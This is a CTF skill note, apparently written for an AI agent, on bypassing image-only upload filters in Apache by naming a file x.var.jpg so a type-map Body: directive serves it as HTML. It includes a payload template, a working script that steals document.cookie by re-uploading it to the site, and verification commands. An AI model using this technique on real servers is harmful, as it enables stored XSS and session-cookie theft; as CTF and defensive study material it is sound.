---
name: apache-typemap-body-xss
description: "Image-upload XSS bypass via Apache type-map Body:."
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [ctf, web, xss, apache, mod_negotiation, typemap, mime, upload-bypass, cookie-theft]
---

# Apache type-map `Body:` — image-upload XSS bypass

## Trigger

Use when a web CTF lets you upload files with a whitelisted *image* extension
(`jpg/jpeg/png/gif`) and you need the browser to execute HTML/JS from that file
(e.g. a bot visits your upload with a non-`httpOnly` flag cookie), but Apache serves
`.jpg` as `image/jpeg` and Chromium will NOT sniff `image/*` to HTML.

## Core idea

Apache's default `mime.conf` ships `AddHandler type-map var`, so **any** file whose
name contains a `.var` extension is parsed by `mod_negotiation` as a type-map — even
`x.var.jpg`. A type-map supports an inline `Body:` directive; when present,
`handle_map_file()` serves those bytes straight from the map file AND honours the
map's `Content-Type:` (the `if (best->body)` branch). This overrides the extension
MIME entirely.

Filename `x.var.jpg` passes a `pathinfo($name, PATHINFO_EXTENSION) in ['jpg',...]`
check (last extension = `jpg`) but is served as `text/html`.

## Payload template

```
Content-Type: text/html
Body: -----E-----
<script>...</script>
-----E-----
```

The string after `Body:` is the closing tag; content is everything up to its next
occurrence (must not appear inside the JS). Upload it with a `.var.jpg` name.

Cookie-exfil variant (works when CSP has `connect-src 'self'` and the bot only allows
same-origin/localhost requests):

```html
<script>fetch('/upload.php',{method:'POST',body:(()=>{let d=new FormData();
d.append('fileToUpload',new Blob([document.cookie],{type:'image/png'}),'leak.png');
d.append('submit','1');return d})()})</script>
```

## Key facts / pitfalls

- `URI:` variants re-derive Content-Type from the referenced file's extension (the
  map's `Content-Type:` is IGNORED for `URI:`). Only `Body:` honours it.
- A `Body:` variant still needs another header that sets `has_content` — always pair
  it with `Content-Type:` (the map parser only pushes a variant when
  `file_name && has_content`).
- Chromium does NOT MIME-sniff `image/*` → HTML (renders broken image, no JS). It
  *does* sniff `text/plain` and missing Content-Type → HTML, so `text/plain`/no-CT
  also works if you can name the file with an unknown extension.
- `.htaccess` fails when `AllowOverride None` is set on the docroot (`<Directory
  /var/www/html/>`). MultiViews is off unless `Options +MultiViews` appears.
- `.php.jpg` double-extension does NOT run PHP in `php:*-apache` images:
  `docker-php.conf` uses `<FilesMatch \.php$> SetHandler application/x-httpd-php`.
- Verify which files actually exist before drawing conclusions: a cron-cleaned file
  returns a 404 error page that is ALSO `text/html` — a classic false positive when
  probing "did my content-type change?".

## Verification

1. `curl -sI "$BASE/uploads/x.var.jpg"` → `Content-Type: text/html` (not image/jpeg).
2. `chromium --headless=new --dump-dom "$BASE/uploads/x.var.jpg"` → confirm the
   `<script>` executed (e.g. a marker div / `document.title` change appears).
3. Trigger the bot/report, poll the exfil endpoint, read the flag.

## References

- Apache source: `modules/mappers/mod_negotiation.c` — `read_type_map()` (line ~934)
  and `handle_map_file()` (line ~2954), the `if (best->body)` branch sets
  `ap_set_content_type_ex(r, best->mime_type, 1)`.
